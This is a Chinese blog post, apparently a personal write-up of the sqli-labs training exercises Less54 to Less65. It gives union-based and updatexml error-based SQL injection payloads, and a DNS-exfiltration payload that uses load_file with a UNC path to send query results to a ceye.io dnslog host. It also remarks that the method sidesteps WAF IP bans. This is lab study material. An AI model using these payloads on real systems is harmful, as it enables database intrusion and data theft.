<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  
  
  
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <title>
    sqlilab做题总结（三） |
    
    Hexo</title>
  
    <link rel="shortcut icon" href="/favicon.ico">
  
  
<link rel="stylesheet" href="/css/style.css">

  
<link rel="stylesheet" href="/css/technology.css">

  
    
<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">

  
  
<script src="/js/pace.min.js"></script>

<meta name="generator" content="Hexo 5.1.1"></head>

<body>
  <div id="container">
    <div id="wrap">
      <section class="outer">
  <article id="post-sqlilab做题总结（三）" class="article article-type-post" itemscope itemprop="blogPost" data-scroll-reveal>

  <div class="article-inner">
    
      <header class="article-header">
        
  
    <h1 class="article-title" itemprop="name">
      sqlilab做题总结（三）
    </h1>
  

      </header>
    

    
      <div class="article-meta">
        <a href="/2020/08/28/sqlilab%E5%81%9A%E9%A2%98%E6%80%BB%E7%BB%93%EF%BC%88%E4%B8%89%EF%BC%89/" class="article-date">
  <time datetime="2020-08-28T02:44:24.000Z" itemprop="datePublished">2020-08-28</time>
</a>
        
  <div class="article-category">
    <a class="article-category-link" href="/categories/web/">web</a> / <a class="article-category-link" href="/categories/web/web%E5%AE%89%E5%85%A8/">web安全</a>
  </div>

      </div>
    

    <div class="article-entry" itemprop="articleBody">
      

      

      
        <h2 id="sqlilab做题总结（三）"><a href="#sqlilab做题总结（三）" class="headerlink" title="sqlilab做题总结（三）"></a>sqlilab做题总结（三）</h2><p>sqlilab今天正式做完一遍啦，今天最后把Less54-Less65完成。</p>
<p>首先这部分的题比较奇怪，限制了注入次数，超过了次数，表名列名字段名都会重置，导致我们进行注入测试的时候需要严格注意每一次注入的内容，其中后面的盲注对脚本的要求也相当高。</p>
<h5 id="Less54-57"><a href="#Less54-57" class="headerlink" title="Less54-57"></a>Less54-57</h5><p>这四个提相对简单，常规的联合查询注入，注意一下闭合方式即可。</p>
<blockquote>
<p>总结一下常见的一些闭合方式：</p>
<p>1.单引号闭合<code>&#39;</code></p>
<p>2.双引号闭合<code>&quot;</code></p>
<p>3.单引号加括号<code>&#39;)</code>‘</p>
<p>4.双引号加括号<code>&#39;&quot;)</code></p>
<p>5.括号(仅限数字型注入)<code>)</code></p>
<p>6.单引号加双括号<code>&#39;))</code></p>
<p>7.双引号加括号<code>&quot;))</code></p>
</blockquote>
<p>这里以54为例注入，主要payload：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0&#x27; union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> %<span class="number">23</span>  <span class="comment"># 判断列数</span></span><br></pre></td></tr></table></figure>

<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0&#x27; union <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> <span class="keyword">group_concat</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="string">&quot;challenges&quot;</span>),<span class="number">3</span> %<span class="number">23</span>    <span class="comment"># 表名(数据库名已知故不需要获取)</span></span><br></pre></td></tr></table></figure>

<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0&#x27; union <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> <span class="keyword">group_concat</span>(column_name) <span class="keyword">from</span> information_schema.columns) <span class="keyword">where</span> table_schema=<span class="string">&quot;challenges&quot;</span> <span class="keyword">and</span> table_name=<span class="string">&quot;XXXXX&quot;</span>),<span class="number">3</span> %<span class="number">23</span>  <span class="comment"># 列名</span></span><br></pre></td></tr></table></figure>

<h5 id="Less58-61"><a href="#Less58-61" class="headerlink" title="Less58-61"></a>Less58-61</h5><p>这三个题也属于基础题，报错注入，同样注意一下闭合方式即可。payload(以58为例)：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and updatexml(1,concat(&#x27;~&#x27;,(<span class="keyword">select</span> <span class="keyword">group_concat</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="string">&quot;challenges&quot;</span>)),<span class="number">1</span>) %<span class="number">23</span></span><br></pre></td></tr></table></figure>

<h5 id="Less62-65"><a href="#Less62-65" class="headerlink" title="Less62-65"></a>Less62-65</h5><p>这几个题难度较高，限制130次查询，盲注出key。</p>
<p>首先判断一下我们需要爆出的字符个数：</p>
<blockquote>
<p>1.数据库名，已知</p>
<p>2.数据表名，10位</p>
<p>3.列名，secret_XXXX，4位</p>
<p>4.字段名，24位</p>
<p>共计38位。</p>
</blockquote>
<p>相当于130次爆出38个字符，平均一个字符3-4次，传统二分法貌似无法实现。不过如果限制放宽一些的话(180-200次)的话，二分法脚本是可以完成的。</p>
<p>如果是Windows环境，这里可以考虑借助DNS来完成注入。首先注册一个ceye.io的账号，随后ceye.io会分配一个子域名，随机分配，这里用xxxxxx代替。load_file函数除了可以读取本地文件之外，也可以对形如<code>\\www.test.com</code>的url发起请求。</p>
<p>在Windows系统中，<code>\\</code>开头的会被识别为UNC路径。</p>
<blockquote>
<p>UNC是一种命名惯例, 主要用于在Microsoft Windows上指定和映射网络驱动器. UNC命名惯例最多被应用于在局域网中访问文件服务器或者打印机。我们日常常用的网络共享文件就是这个方式。</p>
</blockquote>
<p>相当于<code>\\\www.test.com</code>被识别成了网络地址，这里请求的时候会进行dns解析，这里我们便可以通过将我们想要查询的信息写入url中，随后查看dns解析记录(dnslog)，信息便可以获取到了。</p>
<p>payload：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;) and if((<span class="keyword">select</span> <span class="keyword">load_file</span>(<span class="keyword">concat</span>(<span class="string">&#x27;\\\\&#x27;</span>,(<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="string">&quot;challenges&quot;</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="string">&#x27;.xxxxxx.ceye.io\\abc&#x27;</span>))),<span class="number">1</span>,<span class="number">1</span>) %<span class="number">23</span></span><br></pre></td></tr></table></figure>

<p>随后回到ceye.io查看解析记录，发现数据表名已经获得。</p>
<p>ps1.这个方法有局限性，必须是Windows系统，且mysql具有较高权限。</p>
<p>ps2.其他的需要盲注的题目，如果我们反复高频的发送请求，waf可能会ban掉我们的ip，这时如果我们借助这样的方式，就可以轻松的实现数据的读取了。</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://su29029.github.io/2020/08/28/sqlilab%E5%81%9A%E9%A2%98%E6%80%BB%E7%BB%93%EF%BC%88%E4%B8%89%EF%BC%89/" data-id="ckedortls000mxityhc81b6rm"
         class="article-share-link">分享</a>
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web%E5%AE%89%E5%85%A8/" rel="tag">web安全</a></li></ul>

    </footer>

  </div>

  
    
  <nav class="article-nav">
    
      <a href="/2020/08/28/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/" class="article-nav-link">
        <strong class="article-nav-caption">上一篇</strong>
        <div class="article-nav-title">
          
            sql注入总结
          
        </div>
      </a>
    
    
      <a href="/2020/08/28/sqlilab%E5%81%9A%E9%A2%98%E6%80%BB%E7%BB%93%EF%BC%88%E4%BA%8C%EF%BC%89/" class="article-nav-link">
        <strong class="article-nav-caption">下一篇</strong>
        <div class="article-nav-title">sqlilab做题总结（二）</div>
      </a>
    
  </nav>


  

  
    
  

</article>



</section>
    </div>
    
<script src="/js/jquery-2.0.3.min.js"></script>


<script src="/js/lazyload.min.js"></script>


<script src="/js/busuanzi-2.3.pure.min.js"></script>



  
<script src="/fancybox/jquery.fancybox.min.js"></script>






<script src="/js/technology.js"></script>


  </div>
</body>
</html>